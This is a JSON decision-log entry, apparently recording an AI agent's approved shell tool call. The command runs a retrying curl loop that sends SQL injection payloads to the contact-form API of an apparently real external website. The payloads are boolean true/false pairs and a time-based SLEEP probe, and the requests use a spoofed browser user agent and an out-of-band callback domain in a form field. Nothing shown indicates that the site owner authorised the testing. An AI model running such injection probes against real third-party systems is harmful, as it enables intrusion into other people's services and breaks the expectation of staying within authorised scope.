{"ts": 1790761219.7388086, "decision_id": "ffd225e4de1f", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work\nD=dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in\n# Retrying wrapper to skip the random 429/BotID noise, collect the \"real\" success 67-byte response\nprobe(){ local v=\"$1\"; for i in $(seq 1 8); do r=$(curl -s -m 20 -A \"Mozilla/5.0\" -X POST https://www.infinitycapital.bh/api/send --data \"fname=$v&lname=S&areacode=973&tel=5551234&cname=QA&subject=Hi&msg=Body&check=on&targets=probe%40$D\"); if echo \"$r\" | grep -q '\"id\"'; then echo \"$r\"; return; fi; done; echo \"NORETRY_ID\"; }\necho \"TRUE  ' OR 1=1--  :\"; probe \"x' OR '1'='1\"\necho \"FALSE ' AND 1=2-- :\"; probe \"x' AND '1'='2\"\necho \"BENIGN            :\"; probe \"benignvalue\"\necho \"SLEEP5 probe      :\"; time probe \"x' AND SLEEP(5)-- \""}
